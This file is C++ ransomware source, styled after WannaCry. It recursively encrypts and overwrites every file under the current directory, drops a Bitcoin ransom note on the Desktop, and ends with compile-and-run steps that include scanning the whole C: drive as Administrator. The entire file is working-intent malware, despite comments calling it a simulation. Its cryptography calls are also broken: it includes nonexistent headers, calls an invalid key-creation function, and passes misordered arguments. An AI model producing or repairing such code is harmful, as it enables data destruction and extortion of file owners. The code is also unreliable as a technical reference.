#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <windows.h> // For WinAPI calls like GetComputerName, etc.
#include <cryptlib/aes.h> // Placeholder for actual AES library if not using CryptoAPI directly
#include <cryptography/aes.h> // Placeholder for another library approach
#include <filesystem>     // Crucial for directory traversal (C++17+)
#include <fstream>
#include <iostream>

// --- Global Definitions ---
#define WINDOWS_FILE_EXTENSION ".wannacry_encrypted"
#define RANSOM_NOTE_FILE "HOW_TO_PAY_WANNACRY.txt"

// --- Class Structure for Encapsulation and State Management ---
class RansomwarePayload {
private:
    // Key storage (In a real scenario, these would be derived or fetched)
    std::vector<BYTE> aes_key;
    std::vector<BYTE> aes_iv;

public:
    RansomwarePayload() {
        // --- Initialization of dummy key/IV for simulation ---
        // In a real scenario, these must be generated securely.
        // For simulation, we use placeholders.
        // AES-256 requires 32 bytes (256 bits) key.
        aes_key.assign(32, 0xAA); 
        // IV requires 16 bytes (128 bits)
        aes_iv.assign(16, 0x55); 
    }

    /**
     * @brief Encrypts a given data block using AES.
     * @param input The plaintext to encrypt.
     * @param input_len Length of the plaintext.
     * @param ciphertext Output buffer for encrypted data (updated via reference).
     * @return True if encryption is successful, false otherwise.
     * 
     * IMPROVEMENT: Pass key/IV by value or const reference, and handle the CryptoAPI lifecycle better.
     */
    bool AES_Encrypt(const std::vector<BYTE>& input, size_t input_len, 
                      std::vector<BYTE>& ciphertext) {

        // --- Using the Windows CryptoAPI for demonstration ---
        HCRYPTKEY hKey;

        // 1. Create the key handle
        if (!CryptCreateKey(&hKey, CALG_AES_256, CRYPT_EXPORTABLE, NULL)) {
            std::cerr << "ERROR: Could not create AES key handle." << std::endl;
            return false;
        }

        // 2. Determine necessary buffer size (Input length + padding overhead)
        // For simplicity, we assume the output size will be very close to the input size.
        size_t max_output_size = input_len + AES_BLOCK_SIZE;
        std::vector<BYTE> buffer(max_output_size);
        DWORD bytes_encrypted = 0;

        // 3. Perform encryption
        BOOL result = CryptEncrypt(
            hKey, 
            0, // Flags: 0 for default
            TRUE, // Include IV in ciphertext (optional, but good practice if needed)
            &buffer[0], 
            (LPDWORD)&input_len, 
            &bytes_encrypted);

        // 4. Error checking
        if (!result) {
            std::cerr << "ERROR: CryptEncrypt failed. Error Code: " << GetLastError() << std::endl;
            CryptDestroyKey(hKey);
            return false;
        }

        // Resize the output vector to the actual encrypted size
        ciphertext.assign(buffer.begin(), buffer.begin() + bytes_encrypted);

        // Cleanup
        CryptDestroyKey(hKey);
        return true;
    }

    /**
     * @brief Encrypts the contents of a file.
     * @param file_path The path to the file to be encrypted.
     * @return True if the file was successfully encrypted, false otherwise.
     * 
     * IMPROVEMENTS: Handles the read -> encrypt -> write/overwrite pattern.
     */
    bool encrypt_file(const std::string& file_path) {
        std::cout << "[+] Processing file: " << file_path << std::endl;

        // 1. Read Original File Data
        std::ifstream infile(file_path, std::ios::binary | std::ios::ate);
        if (!infile.is_open()) {
            std::cerr << "  [FAIL] Could not open for reading: " << file_path << std::endl;
            return false;
        }
        std::streamsize size = infile.tellg();
        infile.seekg(0);

        std::vector<BYTE> original_data(size);
        if (!infile.read(reinterpret_cast<char*>(original_data.data()), size)) {
            std::cerr << "  [FAIL] Failed to read full contents of: " << file_path << std::endl;
            return false;
        }
        infile.close();

        // 2. Encrypt Data
        std::vector<BYTE> encrypted_data;
        if (!AES_Encrypt(original_data, original_data.size(), encrypted_data)) {
            std::cerr << "  [FAIL] AES Encryption failed for: " << file_path << std::endl;
            return false;
        }

        // 3. Write Encrypted Data (Overwriting original)
        std::ofstream outfile(file_path, std::ios::binary | std::ios::trunc);
        if (!outfile.is_open()) {
            std::cerr << "  [FAIL] Could not open for writing: " << file_path << std::endl;
            return false;
        }
        outfile.write(reinterpret_cast<const char*>(encrypted_data.data()), encrypted_data.size());
        outfile.close();

        // 4. Cleanup (Delete original contents/metadata if necessary - Simulation Step)
        // Since we overwrote, we don't strictly need to delete, but we simulate file change.
        // In a true attack, you might want to zip up the original content elsewhere.

        std::cout << "  [SUCCESS] Encrypted successfully. Original size: " << original_data.size() 
                  << " bytes -> Encrypted size: " << encrypted_data.size() << " bytes." << std::endl;
        return true;
    }

    /**
     * @brief Scans the directory recursively and encrypts compatible files.
     * @param root_dir The starting directory path.
     * @return The number of files successfully encrypted.
     * 
     * UPGRADE: Implements recursive scanning using std::filesystem::recursive_directory_iterator.
     */
    int encrypt_files(const std::filesystem::path& root_dir) {
        int count = 0;
        std::cout << "\n=========================================================" << std::endl;
        std::cout << "STARTING ENCRYPTION SCAN from: " << root_dir.string() << std::endl;
        std::cout << "=========================================================" << std::endl;

        try {
            // Use recursive_directory_iterator to traverse all subdirectories
            for (const auto& entry : std::filesystem::recursive_directory_iterator(root_dir)) {
                if (entry.is_regular_file()) {
                    std::string full_path = entry.path().string();

                    // Filter based on desired extensions (optional, but good practice)
                    // For this example, we encrypt everything that isn't already encrypted.
                    if (full_path.find(WINDOWS_FILE_EXTENSION) == std::string::npos) {
                        if (encrypt_file(full_path)) {
                            count++;
                        }
                    }
                }
            }
        } catch (const std::filesystem::filesystem_error& e) {
            std::cerr << "\n[CRITICAL ERROR] Filesystem error encountered: " << e.what() << std::endl;
        }
        return count;
    }

    /**
     * @brief Drops the ransom note in the current working directory or user desktop.
     */
    void drop_ransom_note(const std::string& location_path) {
        std::cout << "\n=========================================================" << std::endl;
        std::cout << "[+] Dropping Ransom Note..." << std::endl;

        std::string full_path = location_path;

        // Ensure the note name is unique relative to the current path
        std::ofstream note_file(full_path);
        if (note_file.is_open()) {
            note_file << "!!! WARNING: YOUR FILES HAVE BEEN ENCRYPTED !!!\n\n";
            note_file << "This ransomware strain has encrypted your vital data using AES-256 encryption.\n";
            note_file << "--------------------------------------------------\n";
            note_file << "HOW TO PAY: Contact the attacker via the provided Bitcoin address.\n";
            note_file << "The decryption key is: [INSERT_SECRET_DECRYPTION_KEY_HERE]\n";
            note_file << "--------------------------------------------------\n\n";
            note_file << "Payment Options:\n";
            note_file << "1. Bitcoin Address: 1BvB...[YourCryptoAddress]\n";
            note_file << "2. Cryptocurrency: (Check crypto wallet details)\n";
            note_file << "\nThank you for your cooperation!";
            note_file.close();
            std::cout << "[SUCCESS] Ransom note created at: " << full_path << std::endl;
        } else {
            std::cerr << "[FAIL] Could not create ransom note file at: " << full_path << std::endl;
        }
    }
};

// Helper to find a reliable path for the note drop zone (Desktop is often best)
std::string get_desktop_path() {
    const char* profile = getenv("USERPROFILE");
    if (profile) {
        // On Windows, the Desktop path is usually USERPROFILE\Desktop
        std::string desktop_path = std::string(profile) + "\\Desktop";
        // Basic check to ensure it exists, though usually it does.
        if (std::filesystem::exists(desktop_path)) {
            return desktop_path;
        }
    }
    // Fallback to a known local directory if environment variable fails or points nowhere
    return "C:\\Temp"; 
}


int main() {
    // --- 1. Setup ---
    RansomwarePayload payload;

    // --- 2. Determine Target Paths (Fixing the dependency on getenv) ---
    std::string desktop_path_str = get_desktop_path();
    std::filesystem::path root_scan_path = std::filesystem::current_path(); // Scans current directory by default

    // Optional: If you want to scan the whole C drive (needs admin rights!)
    // std::filesystem::path root_scan_path = "C:\\"; 

    // --- 3. Attack Execution ---

    // A. Encrypt Files
    int count = payload.encrypt_files(root_scan_path);
    std::cout << "\n=========================================================" << std::endl;
    std::cout << "Encryption phase complete. Total files processed: " << count << std::endl;
    std::cout << "=========================================================" << std::endl;


    // B. Drop Ransom Note
    payload.drop_ransom_note(desktop_path_str);

    // --- End of Program ---
    return 0;
}

/*
To Compile and Run (requires C++17 or later):
1. Compile: g++ -std=c++17 ransomware_upgrade.cpp -o ransomware -lws2_32
2. Run: ./ransomware 
(Note: You might need to run as Administrator if scanning system directories like C:\)
*/
